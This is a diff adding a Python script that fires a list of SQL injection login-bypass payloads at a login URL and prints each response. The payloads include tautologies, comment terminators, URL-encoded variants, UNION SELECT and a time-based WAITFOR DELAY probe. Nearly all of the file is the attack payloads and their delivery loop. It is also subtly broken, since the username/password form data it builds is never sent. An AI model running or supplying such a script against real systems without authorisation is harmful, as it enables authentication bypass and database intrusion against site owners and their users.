@@ -1,0 +1,56 @@
+import requests
+
+# Example URL to test
+url = "Enter Login URL here!!!"
+
+# Original and new payloads
+payloads = [
+    "' OR '1'='1' -- ",
+    "' OR '1'='1' #",
+    "admin' -- ",
+    "admin'/*",
+    "admin' OR 1=1 --",
+    "admin' OR 1=1#",
+    "admin' OR 1=1/*",
+    "1' AND 1=1 --",
+    "1' AND 1=1#",
+    "1' AND 1=1/*",
+    "%27%20OR%20%271%27%3D%271%27%20--",  # URL encoded payload
+    "%27%20OR%20%271%27%3D%271%27%20%23",  # URL encoded payload with # comment
+    "admin%27%20--%20",                    # URL encoded admin payload
+    "admin%27%2F%2A",                      # URL encoded admin payload with /*
+    "%31%27%20AND%201%3D1%20--",           # Hex encoded payload
+    "%31%27%20AND%201%3D1%23",              # Hex encoded payload with # comment
+    # Further refined payloads 
+    "' OR 1=1 --", 
+    "' OR 1=1#", 
+    "' OR 1=1/*", 
+    "admin' OR '1'='1' --", 
+    "admin' OR '1'='1'#", 
+    "admin' OR '1'='1'/*",
+    # New Advanced payloads
+    " ' OR 1=1 --",
+    " ' OR 1=1#",
+    " ' OR 1=1/*",
+    "admin' OR '1'='1' --",
+    "admin' OR '1'='1'#",
+    "admin' OR '1'='1'/*",
+    " ' OR 'a'='a' --",
+    " ' OR 'a'='a'#",
+    " ' OR 'a'='a'/*",
+    "admin' AND '1'='1'",
+    "admin' UNION SELECT NULL,NULL#",
+    "admin' WAITFOR DELAY '0:0:5' --"
+]
+
+# Loop through payloads and send requests
+for payload in payloads:
+    data = {
+        "username": payload, # Injected payload for testing SQL injection
+        "password": "password123" # Placeholder password
+    }
+    response = requests.get(f"{url}?id={payload}")
+    print(f"Payload: {payload}")
+    print(f"Response Code: {response.status_code}")
+    print(f"Response Body: {response.text[:500]}")  # Print first 500 characters of response
+    print("-----")
